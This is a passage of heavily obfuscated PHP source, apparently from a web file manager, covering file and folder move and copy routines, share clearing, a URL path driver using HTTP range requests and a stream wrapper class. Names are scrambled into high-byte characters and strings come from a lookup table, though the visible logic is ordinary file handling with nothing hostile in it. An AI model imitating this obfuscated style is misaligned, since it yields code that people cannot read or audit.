$Ò¥Á‚ıÚ); $this->sourceCacheClear(); if ($¬ê™Ù²[$¡ªÓİ[496]] == $¡ªÓİ[102] && $ˆ«×Ë‚) { $this->folderSizeResetChildren($şÅò´·±); } Model($¡ªÓİ[243])->linkAdd($®šÀåò[$¡ªÓİ[643]]); if ($ˆ«×Ë‚ && $®šÀåò[$¡ªÓİ[674]]) { $this->removeNow($¥ÖŸ½ùİ, !1); } $this->lockMoveEnd($¥ÖŸ½ùİ); $this->lockWriteEnd($‡¸İ, $¥ÁÄ˜º¨); $this->folderSizeReset($¬ê™Ù²[$¡ªÓİ[203]]); $this->folderSizeReset($‡¸İ); $Šóä£× = array($¬ê™Ù²[$¡ªÓİ[203]], $‡¸İ); if ($¬ê™Ù²[$¡ªÓİ[496]] == $¡ªÓİ[102]) { $Šóä£×[] = $¥ÖŸ½ùİ; } $this->updateModifyTime($Šóä£×); Model($¡ªÓİ[647])->eventMove($¥ÖŸ½ùİ, $¬ê™Ù²[$¡ªÓİ[203]], $‡¸İ); Hook::trigger($¡ªÓİ[673], $‹ûàà§¥); return $şÅò´·±; } private function _move($ë–ÍæçÏ, $ÇèÅŞ¸, $©§Êœ£, &$á‹ì¥ö, $©ğâúá = '') { $ŠŠİøê =& $_SERVER[ü¢ÙÊñÛ]; $ÕÇñ²Û¬ = $this->sourceInfo($ë–ÍæçÏ); $»èêÙ´† = $ÕÇñ²Û¬[$ŠŠİøê[496]] == $ŠŠİøê[102]; $»ß¶ÈëÎ = $©ğâúá ? $©ğâúá : $ÕÇñ²Û¬[$ŠŠİøê[42]]; $¤€ ®Óé = $this->fileNameExistAuto($ÇèÅŞ¸, $ÕÇñ²Û¬); $this->lockMoveStart($ë–ÍæçÏ); $this->lockWriteStart($ÇèÅŞ¸, $»ß¶ÈëÎ); if (!$¤€ ®Óé) { return $this->_moveForce($ë–ÍæçÏ, $ÇèÅŞ¸, $»ß¶ÈëÎ); } $”˜¶š§Æ = $¤€ ®Óé; $†ûÑÈ‘ö = !1; if ($»èêÙ´†) { if ($©§Êœ£ == REPEAT_RENAME_FOLDER) { $»ß¶ÈëÎ = $this->fileNameAuto($ÇèÅŞ¸, $»ß¶ÈëÎ, $©§Êœ£, $»èêÙ´†); $”˜¶š§Æ = $this->_moveForce($ë–ÍæçÏ, $ÇèÅŞ¸, $»ß¶ÈëÎ); } else { if ($©§Êœ£ == REPEAT_RENAME_FOLDER) { $©§Êœ£ = REPEAT_RENAME; } $ÑÎ‡ì = $this->_childrenListSelect($ë–ÍæçÏ); foreach ($ÑÎ‡ì as $“Æ§È‡Ö) { $this->_move($“Æ§È‡Ö[$ŠŠİøê[204]], $¤€ ®Óé, $©§Êœ£, $á‹ì¥ö); } $†ûÑÈ‘ö = !0; } } else { if ($©§Êœ£ == REPEAT_SKIP) { $†ûÑÈ‘ö = !0; } else { if ($©§Êœ£ == REPEAT_RENAME || $©§Êœ£ == REPEAT_RENAME_FOLDER) { $»ß¶ÈëÎ = $this->fileNameAuto($ÇèÅŞ¸, $»ß¶ÈëÎ, $©§Êœ£, $»èêÙ´†); $”˜¶š§Æ = $this->_moveForce($ë–ÍæçÏ, $ÇèÅŞ¸, $»ß¶ÈëÎ); } else { if ($©§Êœ£ == REPEAT_REPLACE) { $ˆ•š›Ï­ = $this->sourceInfoCache($¤€ ®Óé); $ò‘åŸĞ = $this->fileHistory($ˆ•š›Ï­, $ÕÇñ²Û¬[$ŠŠİøê[552]], $ÕÇñ²Û¬[$ŠŠİøê[90]]); $†ûÑÈ‘ö = !0; if ($ò‘åŸĞ) { $á‹ì¥ö[$ŠŠİøê[643]][] = $ÕÇñ²Û¬[$ŠŠİøê[552]]; } } } } } if ($†ûÑÈ‘ö && !$á‹ì¥ö[$ŠŠİøê[674]]) { $á‹ì¥ö[$ŠŠİøê[674]] = !0; } return $”˜¶š§Æ; } private function _moveForce($­ğÎı’£, $æÁ‘üÙ, $¿üÔı£) { $ÆÊ”Í›¨ =& $_SERVER[ü¢ÙÊñÛ]; $³Ä”»Î = $this->sourceInfo($­ğÎı’£); $†´¯ƒœ = $this->sourceInfo($æÁ‘üÙ); $ğò¿£Õ = $³Ä”»Î[$ÆÊ”Í›¨[496]] == $ÆÊ”Í›¨[102]; $ë¤í°…Õ = array($ÆÊ”Í›¨[488] => $†´¯ƒœ[$ÆÊ”Í›¨[204]], $ÆÊ”Í›¨[666] => $†´¯ƒœ[$ÆÊ”Í›¨[595]] . $†´¯ƒœ[$ÆÊ”Í›¨[204]] . $ÆÊ”Í›¨[60], $ÆÊ”Í›¨[662] => $†´¯ƒœ[$ÆÊ”Í›¨[201]], $ÆÊ”Í›¨[663] => $†´¯ƒœ[$ÆÊ”Í›¨[580]], $ÆÊ”Í›¨[665] => USER_ID, $ÆÊ”Í›¨[505] => $¿üÔı£); $Àß« ¼ = $³Ä”»Î[$ÆÊ”Í›¨[201]] == SourceModel::TYPE_GROUP && $†´¯ƒœ[$ÆÊ”Í›¨[201]] == SourceModel::TYPE_GROUP && $³Ä”»Î[$ÆÊ”Í›¨[580]] == $†´¯ƒœ[$ÆÊ”Í›¨[580]]; if (!$Àß« ¼ && $this->moveClearAuth) { Model($ÆÊ”Í›¨[578])->authClear($­ğÎı’£); } $õŒñšİş = $³Ä”»Î[$ÆÊ”Í›¨[516]] == $ÆÊ”Í›¨[102] && $†´¯ƒœ[$ÆÊ”Í›¨[516]] != $ÆÊ”Í›¨[102]; if ($õŒñšİş) { $ë¤í°…Õ[$ÆÊ”Í›¨[515]] = 0; } if ($ğò¿£Õ) { $èÔ¥–í = array($ÆÊ”Í›¨[666] => array($ÆÊ”Í›¨[626], $³Ä”»Î[$ÆÊ”Í›¨[595]] . $³Ä”»Î[$ÆÊ”Í›¨[204]] . $ÆÊ”Í›¨[627])); $âÔáõêÙ = $³Ä”»Î[$ÆÊ”Í›¨[595]] . $³Ä”»Î[$ÆÊ”Í›¨[204]] . $ÆÊ”Í›¨[60]; $§©Ğ“¨ = $†´¯ƒœ[$ÆÊ”Í›¨[595]] . $†´¯ƒœ[$ÆÊ”Í›¨[204]] . $ÆÊ”Í›¨[60] . $³Ä”»Î[$ÆÊ”Í›¨[204]] . $ÆÊ”Í›¨[60]; $±ç‘¬ş = array($ÆÊ”Í›¨[666] => array($ÆÊ”Í›¨[675], "\162\145\160\x6c\141\143\x65\50\160\141\162\145\x6e\164\x4c\x65\166\x65\x6c\x2c\47{$âÔáõêÙ}\x27\x2c\47{$§©Ğ“¨}\x27\x29"), $ÆÊ”Í›¨[662] => $†´¯ƒœ[$ÆÊ”Í›¨[201]], $ÆÊ”Í›¨[663] => $†´¯ƒœ[$ÆÊ”Í›¨[580]]); if ($õŒñšİş) { $±ç‘¬ş[$ÆÊ”Í›¨[515]] = 0; } $this->where($èÔ¥–í)->data($±ç‘¬ş)->save(); } $this->where(array($ÆÊ”Í›¨[502] => $­ğÎı’£))->data($ë¤í°…Õ)->save(); return $­ğÎı’£; } private function clearShare($„›å½Åä, $’›ãŒø²) { $–˜É½— =& $_SERVER[ü¢ÙÊñÛ]; $Ÿ‚¯†¬ = $this->sourceInfo($„›å½Åä); $šÃâ˜½„ = $this->sourceInfo($’›ãŒø²); if ($Ÿ‚¯†¬[$–˜É½—[580]] == $šÃâ˜½„[$–˜É½—[580]] && $Ÿ‚¯†¬[$–˜É½—[201]] == $–˜É½—[676]) { return; } $ÄöŠÜ«ª = array($–˜É½—[595] => array($–˜É½—[626], $Ÿ‚¯†¬[$–˜É½—[595]] . $„›å½Åä . $–˜É½—[627])); $¹àø = $this->field($–˜É½—[502])->where($ÄöŠÜ«ª)->getField($–˜É½—[204], !0); if (!$¹àø) { return; } $ÄöŠÜ«ª = array($–˜É½—[204] => array($–˜É½—[17], $¹àø), $–˜É½—[677] => 1); $£á°›ÓÊ = Model($–˜É½—[678])->field($–˜É½—[679])->where($ÄöŠÜ«ª)->select(); if (!$£á°›ÓÊ) { return; } $£á°›ÓÊ = array_to_keyvalue($£á°›ÓÊ, $–˜É½—[22], $–˜É½—[679]); $ÄöŠÜ«ª = array($–˜É½—[679] => array($–˜É½—[17], $£á°›ÓÊ)); Model($–˜É½—[678])->where($ÄöŠÜ«ª)->save(array($–˜É½—[677] => 0)); Model($–˜É½—[680])->where($ÄöŠÜ«ª)->delete(); } public function copyFolderFromIO($”—´, $Ò¬’¥˜Ÿ, $´Ş»øÒŞ, $İô¬ÑĞ, $¬½²‰¹, $‹ÈÊØÇ = false) { $Üò¦›Ğ‚ =& $_SERVER[ü¢ÙÊñÛ]; $²¦¿“° = array($Üò¦›Ğ‚[644] => array(), $Üò¦›Ğ‚[645] => array(), $Üò¦›Ğ‚[643] => array(), $Üò¦›Ğ‚[681] => array()); $¤±šÆîµ = $‹ÈÊØÇ ? $‹ÈÊØÇ : $”—´->pathThis($Ò¬’¥˜Ÿ); $Âå×¥«ì = $this->fileNameExist($´Ş»øÒŞ, $¤±šÆîµ); $ßç±Â® = $this->mkdir($´Ş»øÒŞ, $¤±šÆîµ, $İô¬ÑĞ); if (!$Âå×¥«ì || $İô¬ÑĞ == REPEAT_RENAME_FOLDER) { $İô¬ÑĞ = !1; } if ($Âå×¥«ì) { $this->_childrenAllMake($Âå×¥«ì); } Hook::trigger($Üò¦›Ğ‚[682]); $this->_copyChildTo($”—´, $Ò¬’¥˜Ÿ, $ßç±Â®, $İô¬ÑĞ, $²¦¿“°, $¬½²‰¹); Hook::trigger($Üò¦›Ğ‚[683]); if ($ßç±Â®) { $this->folderSizeResetChildren($ßç±Â®); } $this->_childrenListClear(); Model($Üò¦›Ğ‚[646])->addAll($²¦¿“°[$Üò¦›Ğ‚[644]], array(), !0); Model($Üò¦›Ğ‚[647])->eventCopy($ßç±Â®); $this->saveAll($²¦¿“°[$Üò¦›Ğ‚[645]]); Model($Üò¦›Ğ‚[555])->linkAdd($²¦¿“°[$Üò¦›Ğ‚[643]]); Model($Üò¦›Ğ‚[555])->remove($²¦¿“°[$Üò¦›Ğ‚[681]]); $this->folderSizeReset($´Ş»øÒŞ); $this->updateModifyTime($´Ş»øÒŞ); return $ßç±Â®; } private function _copyChildTo($Èøâ¾”¶, $ş„Á‹‡À, $¼õİ¡Œ, $ûÃ¶ü…ú, &$›”Ã ½¸, $ïÑ¥õ—) { $õ½Æ›Áó =& $_SERVER[ü¢ÙÊñÛ]; $Ù–êÛ¾ù = $this->sourceInfoCache($¼õİ¡Œ); $øıŸ · = $Èøâ¾”¶->listPath($ş„Á‹‡À); $øıŸ · = $øıŸ · ? $øıŸ · : array($õ½Æ›Áó[97] => array(), $õ½Æ›Áó[96] => array()); $ïÁû°ÅÎ = array_merge($øıŸ ·[$õ½Æ›Áó[97]], $øıŸ ·[$õ½Æ›Áó[96]]); $ô¿ø“ï” = $this->_addFiles($Èøâ¾”¶, $øıŸ ·[$õ½Æ›Áó[97]], $ïÑ¥õ—); $õªœ³‘º = array(); foreach ($ïÁû°ÅÎ as &$»µêî…ô) { if (isset($ô¿ø“ï”[$»µêî…ô[$õ½Æ›Áó[42]]])) { $»µêî…ô = $ô¿ø“ï”[$»µêî…ô[$õ½Æ›Áó[42]]]; } $»µêî…ô[$õ½Æ›Áó[496]] = $»µêî…ô[$õ½Æ›Áó[43]] == $õ½Æ›Áó[89]; $»µêî…ô[$õ½Æ›Áó[497]] = substr(_get($»µêî…ô, $õ½Æ›Áó[180], $õ½Æ›Áó[22]), 0, 10); $»µêî…ô[$õ½Æ›Áó[90]] = _get($»µêî…ô, $õ½Æ›Áó[90], 0); $»µêî…ô[$õ½Æ›Áó[552]] = _get($»µêî…ô, $õ½Æ›Áó[552], 0); if (!isset($»µêî…ô[$õ½Æ›Áó[684]]) && $»µêî…ô[$õ½Æ›Áó[552]]) { $›”Ã ½¸[$õ½Æ›Áó[681]][] = $»µêî…ô[$õ½Æ›Áó[552]]; } if ($ûÃ¶ü…ú) { $äŸÎ·Ãù = $this->fileNameExistCache($¼õİ¡Œ, $»µêî…ô[$õ½Æ›Áó[42]]); if ($äŸÎ·Ãù) { if ($»µêî…ô[$õ½Æ›Áó[496]] || $ûÃ¶ü…ú == REPEAT_SKIP) { continue; } if ($ûÃ¶ü…ú == REPEAT_REPLACE) { $¿•‡ãÄ  = $this->sourceInfoCache($äŸÎ·Ãù); $­Ñ–‹ûª = $this->fileHistory($¿•‡ãÄ , $»µêî…ô[$õ½Æ›Áó[552]], $»µêî…ô[$õ½Æ›Áó[90]]); if ($­Ñ–‹ûª) { $›”Ã ½¸[$õ½Æ›Áó[643]][] = $»µêî…ô[$õ½Æ›Áó[552]]; } continue; } else { if ($ûÃ¶ü…ú == REPEAT_RENAME) { $»µêî…ô[$õ½Æ›Áó[42]] = $this->fileNameAutoCache($¼õİ¡Œ, $»µêî…ô[$õ½Æ›Áó[42]], $ûÃ¶ü…ú, !1); } } } } if (!$»µêî…ô[$õ½Æ›Áó[496]] && $»µêî…ô[$õ½Æ›Áó[552]] == 0) { continue; } if (!$»µêî…ô[$õ½Æ›Áó[496]] && $»µêî…ô[$õ½Æ›Áó[552]]) { $›”Ã ½¸[$õ½Æ›Áó[643]][] = $»µêî…ô[$õ½Æ›Áó[552]]; } $õªœ³‘º[] = $this->_makeItemData($»µêî…ô, $Ù–êÛ¾ù, $»µêî…ô[$õ½Æ›Áó[42]]); } unset($»µêî…ô); if (!empty($õªœ³‘º)) { $this->addAll($õªœ³‘º); $this->_childrenListSelect($¼õİ¡Œ); } $Ç¤ê±å´ = $this->_childrenList($¼õİ¡Œ); $Ç¤ê±å´ = array_to_keyvalue($Ç¤ê±å´, $õ½Æ›Áó[42]); foreach ($ïÁû°ÅÎ as $»µêî…ô) { $¿•‡ãÄ  = $Ç¤ê±å´[$»µêî…ô[$õ½Æ›Áó[42]]]; $‹ü¯®‡Î = $¿•‡ãÄ [$õ½Æ›Áó[204]]; $this->_copyApplyMeta($¿•‡ãÄ , $›”Ã ½¸); if ($»µêî…ô[$õ½Æ›Áó[43]] == $õ½Æ›Áó[89]) { $»µêî…ô[$õ½Æ›Áó[98]] = $Èøâ¾”¶->getPathInner($»µêî…ô[$õ½Æ›Áó[98]]); $this->_copyChildTo($Èøâ¾”¶, $»µêî…ô[$õ½Æ›Áó[98]], $‹ü¯®‡Î, $ûÃ¶ü…ú, $›”Ã ½¸, $ïÑ¥õ—); } } } private function _addFiles($€äª´¨, $û§ôÇ, $´âçšú) { $Šäï¾è£ =& $_SERVER[ü¢ÙÊñÛ]; if (!$û§ôÇ || count($û§ôÇ) == 0) { return array(); } $ã—›Å°ù = array(); foreach ($û§ôÇ as &$÷³€ç) { Hook::trigger($Šäï¾è£[685], $÷³€ç); $÷³€ç[$Šäï¾è£[98]] = $€äª´¨->getPathInner($÷³€ç[$Šäï¾è£[98]]); $¢ãç¾ê€ = $€äª´¨->hashSimple($÷³€ç[$Šäï¾è£[98]]); $—œÙƒªÂ = $€äª´¨->hashMd5($÷³€ç[$Šäï¾è£[98]]); if (strlen($—œÙƒªÂ) > 10 && !isset($ã—›Å°ù[$—œÙƒªÂ])) { $ã—›Å°ù[$—œÙƒªÂ] = array(); } $÷³€ç[$Šäï¾è£[686]] = $¢ãç¾ê€; $÷³€ç[$Šäï¾è£[558]] = $—œÙƒªÂ; $ã—›Å°ù[$—œÙƒªÂ][] =& $÷³€ç; if (count($ã—›Å°ù[$—œÙƒªÂ]) > 1) { $÷³€ç[$Šäï¾è£[684]] = !0; } Hook::trigger($Šäï¾è£[687], $÷³€ç); } unset($÷³€ç); $Ş¯Ôº‰ = array($Šäï¾è£[558] => array($Šäï¾è£[17], array_keys($ã—›Å°ù))); $µáà¸¸ = Model($Šäï¾è£[688]); $÷²èòò = $µáà¸¸->where($Ş¯Ôº‰)->select(); $÷²èòò = $÷²èòò ? $÷²èòò : array(); foreach ($÷²èòò as $ûÇª•½ª) { if (!isset($ã—›Å°ù[$ûÇª•½ª[$Šäï¾è£[558]]])) { continue; } $í†ÅÄµÍ = $ã—›Å°ù[$ûÇª•½ª[$Šäï¾è£[558]]]; foreach ($í†ÅÄµÍ as &$÷³€ç) { $÷³€ç[$Šäï¾è£[552]] = $ûÇª•½ª[$Šäï¾è£[552]]; $÷³€ç[$Šäï¾è£[684]] = !0; } unset($÷³€ç); } $«ˆ‰´Ù° = array(); foreach ($û§ôÇ as $Ë‰Æó—) { Hook::trigger($Šäï¾è£[689], $Ë‰Æó—); if (isset($Ë‰Æó—[$Šäï¾è£[684]]) && $Ë‰Æó—[$Šäï¾è£[684]]) { Hook::trigger($Šäï¾è£[690], $Ë‰Æó—); continue; } $Î×¥œÕ¯ = $€äª´¨->getPathInner($Ë‰Æó—[$Šäï¾è£[98]]); $ÆÑ®„øÔ = $µáà¸¸->addFileMake($Î×¥œÕ¯, $Ë‰Æó—[$Šäï¾è£[90]], $Ë‰Æó—[$Šäï¾è£[686]], $Ë‰Æó—[$Šäï¾è£[558]], $Ë‰Æó—[$Šäï¾è£[42]], $´âçšú); Hook::trigger($Šäï¾è£[690], $Ë‰Æó—); if (!is_array($ÆÑ®„øÔ)) { continue; } $«ˆ‰´Ù°[] = $ÆÑ®„øÔ; } $µáà¸¸->addAll($«ˆ‰´Ù°); $Ş¯Ôº‰ = array($Šäï¾è£[558] => array($Šäï¾è£[17], array_keys($ã—›Å°ù))); $÷²èòò = $µáà¸¸->where($Ş¯Ôº‰)->select(); $÷²èòò = $÷²èòò ? $÷²èòò : array(); foreach ($÷²èòò as $ûÇª•½ª) { if (!isset($ã—›Å°ù[$ûÇª•½ª[$Šäï¾è£[558]]])) { continue; } $¤¨–Ó°İ =& $ã—›Å°ù[$ûÇª•½ª[$Šäï¾è£[558]]]; foreach ($¤¨–Ó°İ as &$÷³€ç) { $÷³€ç[$Šäï¾è£[552]] = $ûÇª•½ª[$Šäï¾è£[552]]; } unset($÷³€ç); } $Ë«…š×ô = array(); foreach ($û§ôÇ as $¿ÙÔşºÑ) { $Ë«…š×ô[$¿ÙÔşºÑ[$Šäï¾è£[42]]] = $¿ÙÔşºÑ; } return $Ë«…š×ô; } } define($_SERVER[ü¢ÙÊñÛ][691], $_SERVER[ü¢ÙÊñÛ][692]); goto DÔùÑ¯ •ƒ; Dİ†µÙÎ¡: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($ìˆğ¦ÙÚ = false) { } public function exist($ĞÒÙšáÜ) { $¼ÀÄÍ” = $this->info($ĞÒÙšáÜ); return $¼ÀÄÍ”[$_SERVER[ü¢ÙÊñÛ][245]]; } public function isFile($”²­éÛë) { $å¦óÖöç = $this->info($”²­éÛë); return $å¦óÖöç[$_SERVER[ü¢ÙÊñÛ][245]]; } public function isFolder($™æ¶óÇÚ) { return !1; } public function size($¬‹ìÉÆ) { $±×¡ûïƒ = $this->info($¬‹ìÉÆ); return $±×¡ûïƒ[$_SERVER[ü¢ÙÊñÛ][90]]; } public function info($ª°ª’±¢) { return $this->infoParse($ª°ª’±¢); } public function infoAuth($»µÉê­Ï) { return $this->infoParse($»µÉê­Ï); } public function infoWithChildren($ØŸÁ–Üú) { return $this->infoParse($ØŸÁ–Üú); } public function infoFull($¿â ú²) { return $this->infoParse($¿â ú²); } private function infoParse($òø¾­) { $ñ±ÚİÇº =& $_SERVER[ü¢ÙÊñÛ]; $œµÕóåş = $this->header($òø¾­); if (!$œµÕóåş || !$œµÕóåş[$ñ±ÚİÇº[815]]) { return !1; } $œÚèàş® = _get($œµÕóåş, $ñ±ÚİÇº[424], 0); $ˆ¤¸€‰‘ = array($ñ±ÚİÇº[42] => $œµÕóåş[$ñ±ÚİÇº[42]], $ñ±ÚİÇº[98] => $òø¾­, $ñ±ÚİÇº[43] => $ñ±ÚİÇº[243], $ñ±ÚİÇº[90] => intval($œÚèàş®), $ñ±ÚİÇº[180] => get_path_ext($œµÕóåş[$ñ±ÚİÇº[42]]), $ñ±ÚİÇº[1445] => $œÚèàş® > 0 && $œµÕóåş[$ñ±ÚİÇº[1595]], $ñ±ÚİÇº[1446] => !1); return $ˆ¤¸€‰‘; } private function header($Ÿ›ŸÙá¢) { $Ó¥ïÜï· =& $_SERVER[ü¢ÙÊñÛ]; if (isset(self::$_cacheHeader[$Ÿ›ŸÙá¢])) { return self::$_cacheHeader[$Ÿ›ŸÙá¢]; } $Îº†õæ = isset($GLOBALS[$Ó¥ïÜï·[1596]]) ? $GLOBALS[$Ó¥ïÜï·[1596]] : !1; $GLOBALS[$Ó¥ïÜï·[1596]] = !0; self::$_cacheHeader[$Ÿ›ŸÙá¢] = url_header($Ÿ›ŸÙá¢); $GLOBALS[$Ó¥ïÜï·[1596]] = $Îº†õæ; return self::$_cacheHeader[$Ÿ›ŸÙá¢]; } public function hashSimple($ìçĞäªÏ, $é¿£î•» = false) { $º‡‰½²Ö =& $_SERVER[ü¢ÙÊñÛ]; $ŞÑÄüú = $this->info($ìçĞäªÏ); if (!$ŞÑÄüú || !$ŞÑÄüú[$º‡‰½²Ö[245]]) { return !1; } $¡ÌÁÁØæ = $ŞÑÄüú[$º‡‰½²Ö[90]]; $¼ñÉ¹¨… = 200; $¯„×”šü = 50; if ($¡ÌÁÁØæ <= $¼ñÉ¹¨… * $¯„×”šü) { return md5($this->fileSubstr($ìçĞäªÏ, 0, $¡ÌÁÁØæ)) . $¡ÌÁÁØæ; } $íÔå’™ = intval($¡ÌÁÁØæ / $¯„×”šü); $¯§õ†ñ = $º‡‰½²Ö[22]; $˜¢¤·‚Â = timeFloat(); $ôŒ«úĞ× = 15; for ($Î‘Ì¡İ = 0; $Î‘Ì¡İ < $¯„×”šü; $Î‘Ì¡İ++) { if (timeFloat() - $˜¢¤·‚Â > $ôŒ«úĞ×) { return !1; } $½ê§Ëãà = $this->fileSubstr($ìçĞäªÏ, $íÔå’™ * $Î‘Ì¡İ, $¼ñÉ¹¨…); if (!$½ê§Ëãà) { return !1; } $¯§õ†ñ .= $½ê§Ëãà; } $¯§õ†ñ .= $this->fileSubstr($ìçĞäªÏ, $¡ÌÁÁØæ - $¼ñÉ¹¨…, $¼ñÉ¹¨…); return md5($¯§õ†ñ) . $¡ÌÁÁØæ; } public function getContent($¦ìó–ıĞ) { return $this->fileSubstr($¦ìó–ıĞ); } public function fileSubstr($ÀÄ¨‹æ, $¸Äïì…´ = 0, $…ˆ¼şéÍ = -1) { $ÇøßããÃ =& $_SERVER[ü¢ÙÊñÛ]; $±Şİª§Å = $this->info($ÀÄ¨‹æ); if (!$±Şİª§Å || !$±Şİª§Å[$ÇøßããÃ[245]] && $±Şİª§Å[$ÇøßããÃ[90]] > 1024 * 1024 * 10) { return !1; } if ($…ˆ¼şéÍ === -1) { $…ˆ¼şéÍ = $±Şİª§Å[$ÇøßããÃ[90]]; } if ($…ˆ¼şéÍ == 0) { return $ÇøßããÃ[22]; } $î…ö‡« = array($ÇøßããÃ[1597] . $¸Äïì…´ . $ÇøßããÃ[851] . ($¸Äïì…´ + $…ˆ¼şéÍ - 1)); $¯­¥î ½ = url_request($ÀÄ¨‹æ, $ÇøßããÃ[1485], !1, $î…ö‡«, !1, !1, 30); return $¯­¥î ½[$ÇøßããÃ[1276]] ? $¯­¥î ½[$ÇøßããÃ[1276]] : $ÇøßããÃ[22]; } public function download($·ˆ‡Ú…, $œÀ—ì“) { Downloader::start($·ˆ‡Ú…, $œÀ—ì“); return $œÀ—ì“; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($íÜ˜ùï, $à±£œ™œ = '') { $this->info = $this->info($íÜ˜ùï); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[ü¢ÙÊñÛ][98]]; $this->pathOpen = $íÜ˜ùï; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$íÜ˜ùï])) { self::$_chunkBuffer[$íÜ˜ùï] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($½©Êô ¥) { $à°½‡¸ = $this->fileSubstr($this->pose, $½©Êô ¥); $this->pose += strlen($à°½‡¸); return $à°½‡¸; } public function stream_tell() { return $this->pose; } public function stream_seek($î¢†¢‚ª, $ÒğÜî‚æ) { $Ö·ØŞÏ =& $_SERVER[ü¢ÙÊñÛ]; if ($ÒğÜî‚æ == SEEK_SET) { $this->pose = $î¢†¢‚ª; } else { if ($ÒğÜî‚æ == SEEK_CUR) { $this->pose += $î¢†¢‚ª; } else { if ($ÒğÜî‚æ == SEEK_END) { $this->pose = $this->info[$Ö·ØŞÏ[90]] + intval($î¢†¢‚ª); } } } if ($î¢†¢‚ª < 0) { $this->pose = $this->info[$Ö·ØŞÏ[90]] + $î¢†¢‚ª; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[ü¢ÙÊñÛ][90]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($²ò¡Ø·³, $äıø¼ ) { $Ùñë’‘Ì =& $_SERVER[ü¢ÙÊñÛ]; $ÇÎ€İ = $this->info($²ò¡Ø·³); return array($Ùñë’‘Ì[1389] => 0, $Ùñë’‘Ì[1598] => 0, $Ùñë’‘Ì[26] => 32768 + 511, $Ùñë’‘Ì[1599] => 0, $Ùñë’‘Ì[1600] => 0, $Ùñë’‘Ì[1601] => 0, $Ùñë’‘Ì[1602] => 0, $Ùñë’‘Ì[90] => $ÇÎ€İ[$Ùñë’‘Ì[90]], $Ùñë’‘Ì[1603] => $ÇÎ€İ[$Ùñë’‘Ì[1444]], $Ùñë’‘Ì[1560] => $ÇÎ€İ[$Ùñë’‘Ì[99]], $Ùñë’‘Ì[1559] => $ÇÎ€İ[$Ùñë’‘Ì[244]], $Ùñë’‘Ì[1604] => 0, $Ùñë’‘Ì[1605] => 0); } static $fileInfo = array(); public function info($»ííšáò) { $¹™èíêŠ = $_SERVER[ü¢ÙÊñÛ][1606]; if (isset(self::$fileInfo[$»ííšáò])) { return self::$fileInfo[$»ííšáò]; } if (substr($»ííšáò, 0, strlen($¹™èíêŠ)) != $¹™èíêŠ) { return !1; } self::$fileInfo[$»ííšáò] = IO::info(substr($»ííšáò, strlen($¹™èíêŠ))); return self::$fileInfo[$»ííšáò]; } public static function read($¿ò «ü, $ªö¨Š×Ñ, $á×§°Ë„) { if (!isset(self::$_fopenCache[$¿ò «ü])) { $Å¦İÓöÈ = new StreamWrapperIO(); $Å¦İÓöÈ->stream_open($¿ò «ü); self::$_fopenCache[$¿ò «ü] = $Å¦İÓöÈ; } $Å¦İÓöÈ = self::$_fopenCache[$¿ò «ü]; return $Å¦İÓöÈ->fileSubstr($ªö¨Š×Ñ, $á×§°Ë„); } public static function _read($¢º¯Ç, $¦¼ÍíÌ¸, $¬üŒ æÈ) { $š—ÀÇ³Ç =& $_SERVER[ü¢ÙÊñÛ]; $ÑØÀî’· = fopen($¢º¯Ç, $š—ÀÇ³Ç[1448]); if (!$ÑØÀî’·) { return $š—ÀÇ³Ç[22]; } $¨³î“¼õ = 8192; fseek($ÑØÀî’·, $¦¼ÍíÌ¸, SEEK_SET); $Ë¨ºÔÊ = $š—ÀÇ³Ç[22]; $Íœ“ú° = 0; while ($Íœ“ú° < $¬üŒ æÈ) { $Â÷Â»ÌÃ = min($¨³î“¼õ, $¬üŒ æÈ - $Íœ“ú°); $Ë¨ºÔÊ .= fread($ÑØÀî’·, $Â÷Â»ÌÃ); $Íœ“ú° += $Â÷Â»ÌÃ; } fclose($ÑØÀî’·); return $Ë¨ºÔÊ; } public function fileSubstr($Ú—¶¤¾, $ïÖüÒ») { $õ²†œÌî =& $_SERVER[ü¢ÙÊñÛ]; $ñã°£ = $this->info[$õ²†œÌî[90]]; $†ûĞİÌè = $Ú—¶¤¾; $€æˆ§Üî = $ïÖüÒ»; if ($Ú—¶¤¾ < 0) { $Ú—¶¤¾ = $ñã°£ + $Ú—¶¤¾; } if ($ïÖüÒ» === !1) { $ïÖüÒ» = $ñã°£ - $Ú—¶¤¾; } if ($Ú—¶¤¾ + $ïÖüÒ» > $ñã°£) { $ïÖüÒ» = $ñã°£ - $Ú—¶¤¾; } if ($ïÖüÒ» <= 0) { return $õ²†œÌî[22]; } if ($Ú—¶¤¾ < 0 || $Ú—¶¤¾ >= $ñã°£ || $ïÖüÒ» <= 0 || $ïÖüÒ» > 1024 * 1024 * 10) { throw new Exception("\151\157\106\151\154\145\122\x65\141\144\x20\145\162\x72\x6f\x72\41\40\x73\x74\141\x72\164\x3d{$Ú—¶¤¾}\73\154\x65\156\x67\x74\150\75{$ïÖüÒ»}\73\40\163\x69\172\145\x3d{$ñã°£}\73"); } $­ã”ôÀ¾ = 64 * 1024; $é¬Œ÷‰¡ =& self::$_chunkBuffer[$this->path]; if (!$é¬Œ÷‰¡) { $é¬Œ÷‰¡ = array(); } $õÄ”¨æë = 0; $Ä©°‚Ú¬ = 0; $‰ãğÕşœ = $õ²†œÌî[22]; foreach ($é¬Œ÷‰¡ as $õÄ”¨æë => $‰ãğÕşœ) { $õÄ”¨æë = intval($õÄ”¨æë); $Ä©°‚Ú¬ = $õÄ”¨æë + strlen($‰ãğÕşœ); if ($Ú—¶¤¾ >= $Ä©°‚Ú¬) { continue; } if ($Ú—¶¤¾ >= $õÄ”¨æë && $Ú—¶¤¾ + $ïÖüÒ» <= $Ä©°‚Ú¬) { return substr($‰ãğÕşœ, $Ú—¶¤¾ - $õÄ”¨æë, $ïÖüÒ»); } break; } if (count($é¬Œ÷‰¡) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($õ²†œÌî[1607], $õ²†œÌî[1608] . count($é¬Œ÷‰¡) . 